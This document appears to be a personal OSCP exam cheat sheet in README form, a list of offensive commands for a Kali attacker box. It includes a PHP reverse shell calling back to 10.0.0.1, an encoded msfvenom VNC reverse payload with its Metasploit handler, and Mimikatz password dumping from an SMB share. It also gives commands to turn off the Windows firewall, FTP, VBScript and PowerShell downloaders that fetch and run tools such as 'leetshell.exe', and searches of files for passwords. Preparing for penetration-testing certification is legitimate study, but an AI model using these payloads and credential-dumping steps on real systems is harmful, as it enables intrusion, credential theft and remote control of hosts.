# OSCP-Repo


## Getting setup

Before starting i like to ensure my Kali instance is ready.
Configutation of each component is required. 
The window will remain open with the output of the SMB Server.

```
service apache2 start
systemctl start postgresql
systemctl start ssh
systemctl start pure-ftpd
impacket-smbserver share /root/smb 
```


## Setup SMB
Copy your post exploit tools to your SMB share allows you to run things directly from the UNC path

```
\\10.0.0.1\share\mimikatz.exe
\\10.0.0.1\share\fgdump.exe
```

## Remote Desktop with custom resolution
```
rdesktop -g 1600x1200 -u username -p password 10.0.0.0
```

## Download file with FTP
```
echo open 10.0.0.1 21> ftp.txt & echo USER barry>> ftp.txt & echo Password>> ftp.txt& echo bin >> ftp.txt & echo GET leetshell.exe >> ftp.txt & echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```
## Probe for remote OS:
```
xprobe2 -v -p tcp:80:open 10.0.0.2
```

## Windows: Copy all files from a structured directory to an unstructured directory
```
for /r C:\Users\barry\ %f in (*.*) do @copy "%f" C:\temp\
````


## Metasploit VNC Handler setup
Doesnt always work, but sometimes its nice to have a GUI.
Payload:

```
msfvenom -p windows/x64/vncinject/reverse_tcp LHOST=10.0.0.1 LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/revvnc.exe
```

Handler Setup:
```
use exploit/multi/handler
set payload windows/vncinject/reverse_tcp
set lhost 10.0.0.1
set lport 443
set autovnc false
set DisableCourtesyShell false 
set ExitOnSession false
set viewonly false
run
```



## Python script to exe
```
C:\Users\Administrator\Desktop\pyinstaller\pyInstaller-2.1>PyInstaller.py --onefile c:\users\administrator\desktop\pythonscript.py
```
## PHP Inclusion?

```
<?php phpinfo();?>
```

## PHP File Inclusion
```
<?php include ('/etc/passwd');?>
```

## PHP - Linux Reverse Shell. 

```
<?php $sock = fsockopen("10.0.0.1",443);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
```


## Add Text to the start of each line in a file:
```
sed 's/^/Start/' sourcefile  > destinationfile
```

## Add Text to the start of each line in a file:
```
sed 's/$/End/' sourcefile  > destinationfile
```

## Cleanup Weird character in Unix
Sometimes got an error about unexpected characters when compiling C program, this fixed it. Using an editor like Nano prevents it from reoccuring 
```
sed -e "s/^M//" Source > Destiantion 
```

## Mimikatz dump passwords (Needs Admin rights)
```
\\10.0.0.1\share\mimikatz.exe
\\10.0.0.1\share\mimikatz64.exe
privilege::debug
sekurlsa::logonPasswords full
```

## Disable Windows Firewall
### 7+
```
netsh advfirewall set  currentprofile state off
```

### xp/2003
```
netsh firewall set opmode mode=DISABLE
```

## Download remote files with low priv Windows shell - wget.vbs.

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
### First thing i download is wget.exe
```
cscript wget.vbs http://10.0.0.1/wget.exe wget.exe
```
## Powershell File Download (First thing i download is the wget.exe)
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.0.0.1/my.ini" >>wget.ps1
echo $file = "wget.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
## Execute the above command
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

## Extract a zip file using Powershell
```
'The location of the zip file.
ZipFile="C:\Test.Zip"
'The folder the contents should be extracted to.
ExtractTo="C:\Test\"

'If the extraction location does not exist create it.
Set fso = CreateObject("Scripting.FileSystemObject")
If NOT fso.FolderExists(ExtractTo) Then
   fso.CreateFolder(ExtractTo)
End If

'Extract the contants of the zip file.
set objShell = CreateObject("Shell.Application")
set FilesInZip=objShell.NameSpace(ZipFile).items
objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)
Set fso = Nothing
Set objShell = Nothing
```

## Get a list of all DLLs currently loaded.
``` 
Listdlls64.exe /AcceptEula
```

## Tell you who a process is running as:
```
Tasklist -v
```


## DLL load order
```
The directory from which the application is loaded (e.g. c:\Program files\Program Name\program.exe)
C:\Windows\System32
C:\Windows\System
C:\Windows
The current working directory
Directories in the system PATH environment variable
Directories in the user PATH environment variable
```

## DLL Hijacking (Couldn't get it working without a GUI - let me know if you can)
https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862085.pdf
https://pentestlab.blog/2017/03/27/dll-hijacking/

## Using ltrace to priv esc SUID/SGID Binaries
https://www.riccardoancarani.it/exploting-setuid-setgid-binaries/

    
## Show NFS mounts
```
showmount -e 10.0.0.2
```

## Alias to make things a little quicker
```
alias l='ls -lah'
alias ss='searchsploit $1'
alias ssx='searchsploit -x $1'
```

## Searchsploit-fu 
Search fo php, remove denial of service category, remove files that end in .php and have a space after it, remove files in /windows/ (For nix hosts), php nuke etc...
```
searchsploit --colour -t php 5 | grep -vi '/dos/\|\.php[^$]' | grep -i '5\.\(5\|x\)' | grep -vi '/windows/\|PHP-Nuke\|RapidKill Pro\|Gift Registry\|Artiphp CMS'
```


## Searching files content - Windows
```
cd C:\ & findstr /SI /M "administrator" *.xml *.ini *.txt
```
```
cd C:\ & findstr /si password *.xml *.ini *.txt *.config
```
```
cd C:\ & findstr /spin "password" *.*
```

## Searching files content - Linux
Search for files with root or password inside them
```
grep -iRl "root" ./ 2>/dev/null
```
```
grep -iRl "password" ./ 2>/dev/null
```


## Buffer Overflow Hex Characters
```
badchars = (
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
```
